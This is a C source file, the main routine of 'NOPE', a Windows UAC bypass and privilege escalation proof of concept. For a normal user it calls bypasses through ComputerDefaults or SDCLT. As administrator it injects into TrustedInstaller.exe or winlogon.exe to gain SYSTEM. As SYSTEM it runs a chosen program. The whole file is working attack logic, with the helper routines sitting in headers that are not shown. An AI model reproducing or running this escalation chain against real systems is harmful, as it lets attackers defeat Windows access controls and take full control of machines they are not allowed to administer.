//
// NOPE Nt Operational Privileges Escalation © Régiolis
//

#include <stdio.h>
#include <Windows.h>
#include "reg.h"
#include "user.h"
#include "privileges.h"
#include "process.h"
#include "version.h"

int main(int argc, char* argv[])
{
	LPCWSTR fileToRun = NULL;
	if (argc > 1) {
		fileToRun = argv[1];
	}

	BOOL isAdmin = IsElevated();
	BOOL isSystem = IsSystem();

	SetConsoleTitle(L"Nt Operational Privileges Escalation");
	printf("--- NOPE - Nt Operational Privileges Escalation ---\n");
	printf("--- UAC Bypass PoC - (c) Regiolis ---\n\n");

	printf("------------------------------------------------\n");
	printf("Is Running As Admin: %s\n", isAdmin ? "TRUE" : "FALSE");
	printf("Is Running As System: %s\n", isSystem ? "TRUE" : "FALSE");
	printf("------------------------------------------------\n\n");

	if (isSystem) {
		if (fileToRun) {
			STARTUPINFO info = { sizeof(info) };
			PROCESS_INFORMATION processInfo;
			if (CreateProcess(NULL, fileToRun, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
			{
				WaitForSingleObject(processInfo.hProcess, INFINITE);
				CloseHandle(processInfo.hProcess);
				CloseHandle(processInfo.hThread);
			}
			else {
				printf("CreateProcess failed (%d).\n", GetLastError());
			}
		}
	}
	else if (isAdmin) {
		CleanRegistry();

		BOOL TISvcStarted = TryStartTIService();
		if (TISvcStarted) DoProcessInjectInside(L"TrustedInstaller.exe", GetCommandLine());
		else DoProcessInjectInside(L"winlogon.exe", GetCommandLine());
	}
	else {
		BOOL isValidConfig = IsValidConfig();
		BOOL memberOfAdmin = IsMemberOfAdminGroup();

		if (!isValidConfig)
		{
			printf("UAC INVALID config\n");
			return -1;
		}

		if (!memberOfAdmin && FALSE)
		{
			printf("User DOESNT belongs to Admin group\n");
			return -1;
		}

		BOOL isW10 = IsWindows10();

		if (isW10) BypassUsingComputerDefaults();
		else BypassUsingSDCLT();
		return 0;
	}

	return 0;
}
